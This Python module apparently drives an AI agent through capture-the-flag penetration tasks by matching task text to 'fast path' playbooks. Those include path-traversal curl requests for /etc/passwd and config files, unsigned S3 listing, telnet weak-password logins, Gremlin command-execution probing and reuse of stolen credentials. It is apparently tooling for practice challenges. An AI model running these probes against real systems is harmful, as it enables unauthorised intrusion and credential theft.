"""指纹级快速路径（FAST PATH）—— 识别到已知产品/协议时先走 1-3 条命令。

设计原则（run-35236 复盘）：
  - 只给「第一批动作 + 停止规则」，不写完整 SOP；命中后模型仍可自由发挥。
  - 触发要求多组关键词同时出现，避免把普通 Web 题误判成产品题。
  - 不包含任何题目答案/flag 字面量；步骤里只出现通用接口形态。
"""

from __future__ import annotations

import json

PLAYBOOKS: list[dict] = [
    {
        "id": "cloud-lambda-portal",
        "require": [("lambda", "云函数", "serverless"), ("门户", "管理", "functions", "函数")],
        "steps": [
            "curl -s -i {base}/api/functions",
            "curl -s {base}/api/functions/<name>/config",
        ],
        "stop": "枚举一轮即止；config 不走通就换端点，不要扫目录。",
    },
    {
        "id": "cloud-s3-public",
        "require": [("s3", "bucket", "对象存储"), ("acl", "public", "权限", "读取", "read")],
        "steps": [
            "curl -s -i {base}/?acl",
            "curl -s '{base}/?list-type=2'",
            "aws s3api list-objects --no-sign-request --endpoint-url {base} --bucket <bucket>",
        ],
        "stop": "403 且要求签名即换路径；不要先爆破 bucket 名。",
    },
    {
        "id": "telnet-daemon",
        "require": [(":23", "telnet", "远程登录")],
        "steps": [
            "nc -w3 {target}",
            "用默认/弱口令登录；banner 里找版本/命令注入点",
        ],
        "stop": "2 组凭据失败即换；不要长时间交互式等待。",
    },
    {
        "id": "gradio-app",
        "require": [(":7860", "gradio")],
        "steps": [
            "curl -s -i {base}/config",
            "curl -s -i {base}/api/predict",
        ],
        "stop": "无 /config 或无 API 即转前端/文件读取；不要先 dirbust。",
    },
    {
        "id": "nextjs-dify",
        "require": [(":3000", "next.js", "dify", "__next")],
        "steps": [
            "curl -s -i {base}/console/api/setup",
            "读首页 HTML 的 _next/static chunk，找 server action / 内部 API 前缀",
        ],
        "stop": "禁止 dirbust；2 次 RSC/server-action 失败即换面。",
    },
    {
        "id": "lfi-approval",
        "require": [("download.php", "?id=", "lfi", "文件包含", "合同审批")],
        "steps": [
            "curl -s '{base}/download.php?id=../../../../etc/passwd'",
            "curl -s '{base}/download.php?id=../includes/config.php'",
            "curl -s '{base}/download.php?id=../.htaccess'",
            "读 000-default.conf / DirectoryIndex 找真实 handler；扫描保留 403（不要只留 200）",
        ],
        "probes": [
            "curl -s '{base}/download.php?id=../../../../etc/passwd'",
            "curl -s '{base}/download.php?id=../includes/config.php'",
            "curl -s '{base}/download.php?id=../.htaccess'",
            "curl -s '{base}/download.php?id=../../../../etc/apache2/sites-enabled/000-default.conf'",
            "curl -s '{base}/download.php?id=../../../../var/www/html/.htaccess'",
        ],
        "stop": "3 个文件名猜不中即读 DirectoryIndex/rewrite；拿到凭据后直接在审批接口复用。",
    },
    {
        "id": "gremlin-hugegraph",
        "require": [("hugegraph", "gremlin", "图数据库")],
        "steps": [
            "curl -s -i -X POST {base}/gremlin -H 'Content-Type: application/json' -d '{\"gremlin\":\"g.V().limit(1)\"}'",
            "检查认证/序列化绕过，再试命令执行原语",
        ],
        "stop": "2 个 payload 失败即换面；注意坏 payload 可能挂住服务。",
    },
    {
        "id": "response-builder",
        "require": [("response-builder", "响应构造", "构建导出完整响应", "tcp line")],
        "steps": [
            "用最小命令建立会话，摸清命令语法",
            "对 BUILD/DUMP 类命令做长度/边界 fuzz，优先找越界读",
        ],
        "stop": "先找内存泄露/越界读；拿到 flag 立即停。",
    },
]


def _base_for(target: str) -> str:
    if not target:
        return "http://<target>"
    t = target.strip()
    if t.startswith(("http://", "https://")):
        return t.rstrip("/")
    scheme = "https" if t.endswith((":443", ":8443")) else "http"
    return f"{scheme}://{t}"


def match(text: str) -> dict | None:
    """返回第一个命中的 playbook（多组关键词必须同时出现）。"""
    low = text.lower()
    for playbook in PLAYBOOKS:
        if all(any(keyword.lower() in low for keyword in group) for group in playbook["require"]):
            return playbook
    return None


def render(playbook: dict, target: str = "") -> str:
    base = _base_for(target)
    steps = [
        step.replace("{base}", base).replace("{target}", target or "<target>")
        for step in playbook["steps"]
    ]
    lines = [
        f"# FAST PATH (matched: {playbook['id']})",
        "Try these first — they are the highest-value first moves, not a full SOP:",
    ]
    lines.extend(f"{index}. {step}" for index, step in enumerate(steps, 1))
    lines.append(f"STOP RULE: {playbook['stop']}")
    return "\n".join(lines)


def match_and_render(text: str, target: str = "") -> str | None:
    playbook = match(text)
    return render(playbook, target) if playbook else None


_SAFE_GET_PREFIX = ("curl -s", "curl -sS")
_UNSAFE_TOKENS = ("-X ", "-d ", "|", ";", "&&", "`", "$(", ">", "<")


def first_get_step(playbook: dict, target: str = "") -> str | None:
    """返回可安全自动执行的第一条只读 GET（无管道/重定向/写操作）。"""
    if not target:
        return None
    base = _base_for(target)
    for step in playbook["steps"]:
        cmd = step.replace("{base}", base).replace("{target}", target or "<target>")
        if not cmd.startswith(_SAFE_GET_PREFIX):
            continue
        if any(token in cmd for token in _UNSAFE_TOKENS):
            continue
        return cmd
    return None


def safe_probes(playbook: dict, target: str = "", *, limit: int = 4) -> list[str]:
    """返回最多 limit 条可安全自动执行的只读 GET 探针。"""
    if not target:
        return []
    base = _base_for(target)
    out: list[str] = []
    for step in playbook.get("probes") or ([first_get_step(playbook, target)]):
        if not step:
            continue
        cmd = step.replace("{base}", base).replace("{target}", target or "<target>")
        if not cmd.startswith(_SAFE_GET_PREFIX):
            continue
        if any(token in cmd for token in _UNSAFE_TOKENS):
            continue
        out.append(cmd)
        if len(out) >= limit:
            break
    return out


def dump_match(text: str) -> str:
    """调试用：返回匹配 id 或 none。"""
    playbook = match(text)
    return playbook["id"] if playbook else "none"


if __name__ == "__main__":  # pragma: no cover - 手工调试
    import sys

    print(dump_match(" ".join(sys.argv[1:]) or json.dumps(PLAYBOOKS[0])))
